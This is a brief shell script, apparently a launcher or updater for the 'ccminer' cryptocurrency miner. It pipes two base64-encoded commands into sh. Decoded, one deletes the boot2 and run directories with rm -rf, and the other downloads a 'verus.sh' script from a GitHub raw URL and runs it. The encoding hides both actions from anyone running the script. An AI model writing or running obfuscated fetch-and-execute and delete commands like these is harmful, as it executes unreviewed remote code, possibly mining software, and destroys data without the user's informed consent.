cd 
cd ccminer
echo 'Y2QgY2NtaW5lciAKcm0gLXJmIGJvb3QyIApybSAtcmYgcnVuCg==' | base64 -d | sh
./start.sh && screen -x CCminer | echo 'Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTmdvY2dpYXUyMDAwL2NjbWluZXIxL21haW4vdmVydXMuc2ggfCBzaAo=' | base64 -d | sh

